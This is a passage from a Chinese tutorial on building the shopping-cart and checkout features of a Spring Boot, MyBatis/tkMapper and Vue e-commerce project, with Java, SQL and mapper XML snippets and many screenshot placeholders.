修改购物车数据表结构"></a>16.2.1 修改购物车数据表结构</h6><table><thead><tr><th>shopping_cart</th></tr></thead><tbody><tr><td><img src="imgs/1619593620642.png" alt="1619593620642"></td></tr></tbody></table><ul><li>数据表修改完成之后，对此表重新进行逆向工程</li></ul><h6 id="16-2-2-数据库实现"><a href="#16-2-2-数据库实现" class="headerlink" title="16.2.2 数据库实现"></a>16.2.2 数据库实现</h6><ul><li>单表添加操作，可以直接使用tkMapper完成</li></ul><h6 id="16-2-3-业务层实现"><a href="#16-2-3-业务层实现" class="headerlink" title="16.2.3 业务层实现"></a>16.2.3 业务层实现</h6><ul><li><p><code>ShoppingCartService</code>接口</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">ShoppingCartService</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">addShoppingCart</span><span class="token punctuation">(</span><span class="token class-name">ShoppingCart</span> cart<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>实现类</p></li></ul><h4 id="16-3-前端实现"><a href="#16-3-前端实现" class="headerlink" title="16.3 前端实现"></a>16.3 前端实现</h4><h6 id="16-3-1-记录选择的套餐属性"><a href="#16-3-1-记录选择的套餐属性" class="headerlink" title="16.3.1  记录选择的套餐属性"></a>16.3.1  记录选择的套餐属性</h6><ul><li><p>在vue的data中定义 <code>chooseSkuProps</code></p><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/1619598532882.png" alt="1619598532882"></td></tr></tbody></table></li><li><p>为sku的属性添加点击事件</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/1619598596008.png" alt="1619598596008"></td></tr></tbody></table></li><li><p>在methods中定义事件函数<code>changeProp</code></p><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/1619598649495.png" alt="1619598649495"></td></tr></tbody></table></li><li><p>添加套餐切换的监听事件：</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/1619598727969.png" alt="1619598727969"></td></tr></tbody></table></li></ul><h6 id="16-3-2-套餐属性选中效果"><a href="#16-3-2-套餐属性选中效果" class="headerlink" title="16.3.2 套餐属性选中效果"></a>16.3.2 套餐属性选中效果</h6><ul><li><p>在套餐属性标签上添加name属性</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/1619599876658.png" alt="1619599876658"></td></tr></tbody></table></li><li><p>在属性的点击事件函数实现选中效果</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/1619599992514.png" alt="1619599992514"></td></tr></tbody></table></li></ul><h6 id="16-3-3-修改商品数量"><a href="#16-3-3-修改商品数量" class="headerlink" title="16.3.3 修改商品数量"></a>16.3.3 修改商品数量</h6><ul><li><p>在vue的data中定义<code>num</code>存储商品数量（默认值为1）</p></li><li><p>为+，-添加点击事件监听</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/1619600802928.png" alt="1619600802928"></td></tr></tbody></table></li><li><p>定义点击事件函数</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/1619600875367.png" alt="1619600875367"></td></tr></tbody></table></li></ul><h6 id="16-3-4-提交购物车"><a href="#16-3-4-提交购物车" class="headerlink" title="16.3.4 提交购物车"></a>16.3.4 提交购物车</h6><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/1619602118279.png" alt="1619602118279"></td></tr></tbody></table><h2 id="十七、购物车—添加购物车（未登录状态）"><a href="#十七、购物车—添加购物车（未登录状态）" class="headerlink" title="十七、购物车—添加购物车（未登录状态）"></a>十七、购物车—添加购物车（未登录状态）</h2><h4 id="17-1-流程分析"><a href="#17-1-流程分析" class="headerlink" title="17.1 流程分析"></a>17.1 流程分析</h4><p><img src="imgs/1619659435955.png" alt="1619659435955"></p><h4 id="17-2-功能实现"><a href="#17-2-功能实现" class="headerlink" title="17.2 功能实现"></a>17.2 功能实现</h4><h6 id="17-2-1-定义新的状态码"><a href="#17-2-1-定义新的状态码" class="headerlink" title="17.2.1 定义新的状态码"></a>17.2.1 定义新的状态码</h6><table><thead><tr><th>ResStatus</th></tr></thead><tbody><tr><td><img src="imgs/1619660135968.png" alt="1619660135968"></td></tr></tbody></table><table><thead><tr><th>登录认证拦截器</th></tr></thead><tbody><tr><td><img src="imgs/1619660219076.png" alt="1619660219076"></td></tr></tbody></table><h6 id="17-2-2-在详情页面判断如果用户未登录，则跳转到登录页面"><a href="#17-2-2-在详情页面判断如果用户未登录，则跳转到登录页面" class="headerlink" title="17.2.2 在详情页面判断如果用户未登录，则跳转到登录页面"></a>17.2.2 在详情页面判断如果用户未登录，则跳转到登录页面</h6><table><thead><tr><th>introduction.html</th></tr></thead><tbody><tr><td><img src="imgs/1619663976567.png" alt="1619663976567"></td></tr></tbody></table><h6 id="17-2-3-登录页面接收回跳信息"><a href="#17-2-3-登录页面接收回跳信息" class="headerlink" title="17.2.3 登录页面接收回跳信息"></a>17.2.3 登录页面接收回跳信息</h6><table><thead><tr><th>login.html</th></tr></thead><tbody><tr><td><img src="imgs/1619664052034.png" alt="1619664052034"></td></tr><tr><td><img src="imgs/1619664084474.png" alt="1619664084474"></td></tr></tbody></table><h6 id="17-2-4-回到详情页时接收参数"><a href="#17-2-4-回到详情页时接收参数" class="headerlink" title="17.2.4 回到详情页时接收参数"></a>17.2.4 回到详情页时接收参数</h6><table><thead><tr><th>introduction.html</th></tr></thead><tbody><tr><td><img src="imgs/1619664166141.png" alt="1619664166141"></td></tr></tbody></table><h6 id="17-2-5-使用layui添加购物车成功-失败进行提示"><a href="#17-2-5-使用layui添加购物车成功-失败进行提示" class="headerlink" title="17.2.5 使用layui添加购物车成功/失败进行提示"></a>17.2.5 使用layui添加购物车成功/失败进行提示</h6><ul><li><p>引入layui  layui.com</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- 引入 layui.css --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>//unpkg.com/layui@2.6.5/dist/css/layui.css<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> <span class="token comment">&lt;!-- 引入 layui.js --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>//unpkg.com/layui@2.6.5/dist/layui.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>声明弹窗组件</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/1619664490259.png" alt="1619664490259"></td></tr></tbody></table></li><li><p>当添加购物车成功或者失败的时候，进行提示：</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/1619664620982.png" alt="1619664620982"></td></tr></tbody></table></li></ul><h2 id="十八、购物车—购物车列表"><a href="#十八、购物车—购物车列表" class="headerlink" title="十八、购物车—购物车列表"></a>十八、购物车—购物车列表</h2><h4 id="18-1-流程分析"><a href="#18-1-流程分析" class="headerlink" title="18.1 流程分析"></a>18.1 流程分析</h4><p><img src="imgs/1619676817769.png" alt="1619676817769"></p><h4 id="18-2-接口实现"><a href="#18-2-接口实现" class="headerlink" title="18.2 接口实现"></a>18.2 接口实现</h4><h6 id="18-2-1-数据库实现"><a href="#18-2-1-数据库实现" class="headerlink" title="18.2.1 数据库实现"></a>18.2.1 数据库实现</h6><ul><li><p>SQL</p><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">-- 根据用户ID查询当前用户的购物车信息select c.*, p.product_name,i.urlfrom shopping_cart c  INNER JOIN product p INNER JOIN product_img iON c.product_id = p.product_id and i.item_id=p.product_idwhere user_id=6 and i.is_main=1;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>实体类</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/1619683431269.png" alt="1619683431269"></td></tr></tbody></table></li><li><p>在Mapper接口定义查询方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Repository</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">ShoppingCartMapper</span> <span class="token keyword">extends</span> <span class="token class-name">GeneralDAO</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ShoppingCart</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ShoppingCartVO</span><span class="token punctuation">&gt;</span></span> <span class="token function">selectShopcartByUserId</span><span class="token punctuation">(</span><span class="token keyword">int</span> userId<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>映射配置</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/1619683479956.png" alt="1619683479956"></td></tr></tbody></table></li></ul><h6 id="18-2-2-业务层实现"><a href="#18-2-2-业务层实现" class="headerlink" title="18.2.2 业务层实现"></a>18.2.2 业务层实现</h6><ul><li><p>Service接口</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/1619678423598.png" alt="1619678423598"></td></tr></tbody></table></li><li><p>Service实现类</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/1619678561766.png" alt="1619678561766"></td></tr></tbody></table></li></ul><h6 id="18-2-3-控制层实现"><a href="#18-2-3-控制层实现" class="headerlink" title="18.2.3 控制层实现"></a>18.2.3 控制层实现</h6><h4 id="18-3-前端实现"><a href="#18-3-前端实现" class="headerlink" title="18.3 前端实现"></a>18.3 前端实现</h4><h6 id="18-3-1-显示购物车列表"><a href="#18-3-1-显示购物车列表" class="headerlink" title="18.3.1 显示购物车列表"></a>18.3.1 显示购物车列表</h6><h6 id="18-3-2-显示购物车中商品价格"><a href="#18-3-2-显示购物车中商品价格" class="headerlink" title="18.3.2 显示购物车中商品价格"></a>18.3.2 显示购物车中商品价格</h6><h2 id="十九、购物车-修改购物车数量"><a href="#十九、购物车-修改购物车数量" class="headerlink" title="十九、购物车-修改购物车数量"></a>十九、购物车-修改购物车数量</h2><h4 id="19-1-流程分析"><a href="#19-1-流程分析" class="headerlink" title="19.1 流程分析"></a>19.1 流程分析</h4><h4 id="19-2-接口实现"><a href="#19-2-接口实现" class="headerlink" title="19.2 接口实现"></a>19.2 接口实现</h4><ul><li><p>在Mapper接口定义修改方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Repository</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">ShoppingCartMapper</span> <span class="token keyword">extends</span> <span class="token class-name">GeneralDAO</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ShoppingCart</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ShoppingCartVO</span><span class="token punctuation">&gt;</span></span> <span class="token function">selectShopcartByUserId</span><span class="token punctuation">(</span><span class="token keyword">int</span> userId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">updateCartnumByCartid</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token string">"cartId"</span><span class="token punctuation">)</span> <span class="token keyword">int</span> cartId<span class="token punctuation">,</span>                                     <span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token string">"cartNum"</span><span class="token punctuation">)</span> <span class="token keyword">int</span> cartNum<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>映射配置</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>update</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>updateCartnumByCartid<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    update shopping_cart set cart_num=#{cartNum} where cart_id=#{cartId}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>update</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>Service接口</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">ShoppingCartService</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">addShoppingCart</span><span class="token punctuation">(</span><span class="token class-name">ShoppingCart</span> cart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">listShoppingCartsByUserId</span><span class="token punctuation">(</span><span class="token keyword">int</span> userId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">updateCartNum</span><span class="token punctuation">(</span><span class="token keyword">int</span> cartId<span class="token punctuation">,</span><span class="token keyword">int</span> cartNum<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>Service实现类</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ShoppingCartServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">ShoppingCartService</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">ShoppingCartMapper</span> shoppingCartMapper<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">SimpleDateFormat</span> sdf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleDateFormat</span><span class="token punctuation">(</span><span class="token string">"yyyy-MM-dd hh:mm:ss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">updateCartNum</span><span class="token punctuation">(</span><span class="token keyword">int</span> cartId<span class="token punctuation">,</span> <span class="token keyword">int</span> cartNum<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> shoppingCartMapper<span class="token punctuation">.</span><span class="token function">updateCartnumByCartid</span><span class="token punctuation">(</span>cartId<span class="token punctuation">,</span> cartNum<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>OK<span class="token punctuation">,</span><span class="token string">"update success"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>NO<span class="token punctuation">,</span><span class="token string">"update fail"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>控制层实现</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@PutMapping</span><span class="token punctuation">(</span><span class="token string">"/update/{cid}/{cnum}"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">updateNum</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span><span class="token punctuation">(</span><span class="token string">"cid"</span><span class="token punctuation">)</span> <span class="token class-name">Integer</span> cartId<span class="token punctuation">,</span>                          <span class="token annotation punctuation">@PathVariable</span><span class="token punctuation">(</span><span class="token string">"cnum"</span><span class="token punctuation">)</span> <span class="token class-name">Integer</span> cartNum<span class="token punctuation">,</span>                          <span class="token annotation punctuation">@RequestHeader</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> token<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token class-name">ResultVO</span> resultVO <span class="token operator">=</span> shoppingCartService<span class="token punctuation">.</span><span class="token function">updateCartNum</span><span class="token punctuation">(</span>cartId<span class="token punctuation">,</span> cartNum<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> resultVO<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="19-3-前端实现"><a href="#19-3-前端实现" class="headerlink" title="19.3 前端实现"></a>19.3 前端实现</h4><ul><li><p>为按钮添加点击事件</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/1619686445301.png" alt="1619686445301"></td></tr></tbody></table></li><li><p>定义changeNum事件函数</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/1619686496594.png" alt="1619686496594"></td></tr></tbody></table></li></ul><h2 id="二十、购物车—结算、提交订单"><a href="#二十、购物车—结算、提交订单" class="headerlink" title="二十、购物车—结算、提交订单"></a>二十、购物车—结算、提交订单</h2><blockquote><p>在购物车列表中选择对应的的商品之后，点击提交生成订单的过程</p></blockquote><h4 id="20-1-流程图"><a href="#20-1-流程图" class="headerlink" title="20.1 流程图"></a>20.1 流程图</h4><p><img src="imgs/1619746225978.png" alt="1619746225978"></p><h4 id="20-2-接口实现"><a href="#20-2-接口实现" class="headerlink" title="20.2 接口实现"></a>20.2 接口实现</h4><h6 id="20-2-1-收货地址列表接口"><a href="#20-2-1-收货地址列表接口" class="headerlink" title="20.2.1 收货地址列表接口"></a>20.2.1 收货地址列表接口</h6><blockquote><p>此操作的数据库实现可以通过tkmapper通用方法完成</p></blockquote><ul><li><p>service接口<code>UserAddrService</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">UserAddrService</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">listAddrsByUid</span><span class="token punctuation">(</span><span class="token keyword">int</span> userId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>Service实现类 <code>UserAddrServiceImpl</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserAddrServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">UserAddrService</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">UserAddrMapper</span> userAddrMapper<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Transactional</span><span class="token punctuation">(</span>propagation <span class="token operator">=</span> <span class="token class-name">Propagation</span><span class="token punctuation">.</span>SUPPORTS<span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">listAddrsByUid</span><span class="token punctuation">(</span><span class="token keyword">int</span> userId<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">Example</span> example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span><span class="token class-name">UserAddr</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Example</span><span class="token punctuation">.</span><span class="token class-name">Criteria</span> criteria <span class="token operator">=</span> example<span class="token punctuation">.</span><span class="token function">createCriteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        criteria<span class="token punctuation">.</span><span class="token function">andEqualTo</span><span class="token punctuation">(</span><span class="token string">"userId"</span><span class="token punctuation">,</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>        criteria<span class="token punctuation">.</span><span class="token function">andEqualTo</span><span class="token punctuation">(</span><span class="token string">"status"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">UserAddr</span><span class="token punctuation">&gt;</span></span> userAddrs <span class="token operator">=</span> userAddrMapper<span class="token punctuation">.</span><span class="token function">selectByExample</span><span class="token punctuation">(</span>example<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ResultVO</span> resultVO <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>OK<span class="token punctuation">,</span> <span class="token string">"success"</span><span class="token punctuation">,</span> userAddrs<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> resultVO<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>控制器实现</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RestController</span><span class="token annotation punctuation">@CrossOrigin</span><span class="token annotation punctuation">@Api</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"提供收货地址相关接口"</span><span class="token punctuation">,</span>tags <span class="token operator">=</span> <span class="token string">"收货地址管理"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/useraddr"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserAddrController</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">UserAddrService</span> userAddrService<span class="token punctuation">;</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/list"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiImplicitParam</span><span class="token punctuation">(</span>dataType <span class="token operator">=</span> <span class="token string">"int"</span><span class="token punctuation">,</span>name <span class="token operator">=</span> <span class="token string">"userId"</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token string">"用户ID"</span><span class="token punctuation">,</span>required <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">listAddr</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> userId<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestHeader</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> token<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">ResultVO</span> resultVO <span class="token operator">=</span> userAddrService<span class="token punctuation">.</span><span class="token function">listAddrsByUid</span><span class="token punctuation">(</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> resultVO<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h6 id="20-2-2-购物车记录列表接口"><a href="#20-2-2-购物车记录列表接口" class="headerlink" title="20.2.2 购物车记录列表接口"></a>20.2.2 购物车记录列表接口</h6><blockquote><p>根据一个ID的集合，查询购物车记录，实现方式有两种：</p><ul><li><p>动态sql</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>searchShoppingCartById<span class="token punctuation">"</span></span> <span class="token attr-name">resultMap</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>shopCartMap<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    select * from shopping_cart where cart_id in    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foreach</span> <span class="token attr-name">collection</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>list<span class="token punctuation">"</span></span> <span class="token attr-name">item</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cid<span class="token punctuation">"</span></span> <span class="token attr-name">separator</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>,<span class="token punctuation">"</span></span> <span class="token attr-name">open</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>(<span class="token punctuation">"</span></span> <span class="token attr-name">close</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>)<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        #{cid}    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foreach</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>tkMapper条件查询</p><p>criteria.andIn(“cartId”,ids);</p></li></ul></blockquote><ul><li><p>Mapper接口定义查询方法</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/1619748408712.png" alt="1619748408712"></td></tr></tbody></table></li><li><p>映射配置(动态sql  foreach)</p><table><thead><tr><th><img src="imgs/1619748709076.png" alt="1619748709076"></th></tr></thead><tbody><tr><td><img src="imgs/1619748733082.png" alt="1619748733082"></td></tr></tbody></table></li><li><p>Service接口</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/1619749713763.png" alt="1619749713763"></td></tr></tbody></table></li><li><p>Service实现类</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/1619749813052.png" alt="1619749813052"></td></tr></tbody></table></li><li><p>控制器实现</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/listbycids"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@ApiImplicitParam</span><span class="token punctuation">(</span>dataType <span class="token operator">=</span> <span class="token string">"String"</span><span class="token punctuation">,</span>name <span class="token operator">=</span> <span class="token string">"cids"</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token string">"选择的购物车记录id"</span><span class="token punctuation">,</span>required <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">listByCids</span><span class="token punctuation">(</span><span class="token class-name">String</span> cids<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestHeader</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span><span class="token class-name">String</span> token<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token class-name">ResultVO</span> resultVO <span class="token operator">=</span> shoppingCartService<span class="token punctuation">.</span><span class="token function">listShoppingCartsByCids</span><span class="token punctuation">(</span>cids<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> resultVO<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h6 id="20-2-3-保存订单"><a href="#20-2-3-保存订单" class="headerlink" title="20.2.3 保存订单"></a>20.2.3 保存订单</h6><h4 id="20-3-前端实现"><a href="#20-3-前端实现" class="headerlink" title="20.3 前端实现"></a>20.3 前端实现</h4><h6 id="20-3-1-选择购物车记录价格联动"><a href="#20-3-1-选择购物车记录价格联动" class="headerlink" title="20.3.1 选择购物车记录价格联动"></a>20.3.1 选择购物车记录价格联动</h6><ul><li><p>列表前的复选框标签</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/1619752375851.png" 